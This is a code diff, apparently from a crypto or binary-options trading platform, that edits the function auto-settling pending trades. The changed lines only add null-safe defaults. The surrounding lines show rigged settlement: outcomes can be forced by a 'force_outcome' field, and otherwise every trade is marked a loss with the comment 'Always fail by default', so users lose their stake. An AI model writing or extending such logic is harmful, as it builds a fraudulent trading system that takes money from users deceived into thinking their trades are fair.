@@ -284,7 +284,7 @@ const initializeDatabase = async () => {
       if (!dbAvailable || !pool) return;
       try {
         const res = await pool.query(
-          "SELECT * FROM trades WHERE status = 'pending' AND created_at <= NOW() - (duration || ' seconds')::interval"
+          "SELECT * FROM trades WHERE status = 'pending' AND created_at <= NOW() - (COALESCE(duration, 60) || ' seconds')::interval"
         );
         for (const trade of res.rows) {
           console.log(`[Auto-Settle] Settling trade ${trade.id} for ${trade.wallet_address}`);
@@ -293,9 +293,10 @@ const initializeDatabase = async () => {
           else if (trade.force_outcome === 'loss') isWin = false;
           else isWin = false; // Always fail by default
 
-          const leverageFactor = (parseFloat(trade.leverage) || 10) / 10;
+          const leverageFactor = (parseFloat(trade.leverage || 10)) / 10;
+          const amount = parseFloat(trade.amount || 0);
           const payoutRate = 0.85;
-          const payout = isWin ? parseFloat(trade.amount) * (1 + (payoutRate * leverageFactor)) : 0;
+          const payout = isWin ? amount * (1 + (payoutRate * leverageFactor)) : 0;
           const balanceField = trade.is_demo ? 'demo_balance' : 'trading_balance';
 
           await pool.query(
